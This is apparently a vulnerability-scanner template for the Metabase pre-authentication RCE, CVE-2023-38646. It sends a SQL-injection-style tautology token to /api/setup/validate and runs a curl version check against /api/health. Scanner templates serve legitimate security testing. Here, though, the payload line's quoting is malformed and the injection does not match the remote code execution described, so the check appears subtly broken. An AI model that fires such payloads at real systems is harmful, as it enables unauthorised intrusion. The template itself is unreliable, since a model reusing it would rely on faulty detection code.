AUTHOR='@xer0dayz'
VULN_NAME='CVE-2023-38646 - Metabase Pre-Auth RCE'
URI="/api/setup/validate"
METHOD='POST'
MATCH='"valid":true'
SEVERITY='P1 - CRITICAL'
CURL_OPTS="--user-agent 'Mozilla/5.0' -s --insecure -L -H 'Content-Type: application/json'"
PAYLOAD='{"token":"1\' or \'1\'=\''1'}'"
SECONDARY_COMMANDS='''
# Check for Metabase version
VERSION_CHECK=$(curl -s -k "https://$TARGET/api/health" | grep -oP '(?<="version":\{"tag":")[^"]+')
if [ -n "$VERSION_CHECK" ]; then
    echo -e "\n[+] Metabase Version: $VERSION_CHECK"
    echo "[*] Versions before 0.46.6.1, 1.46.6.1, 2.0.0 are vulnerable"
fi
'''

# This vulnerability allows unauthenticated remote code execution on Metabase instances
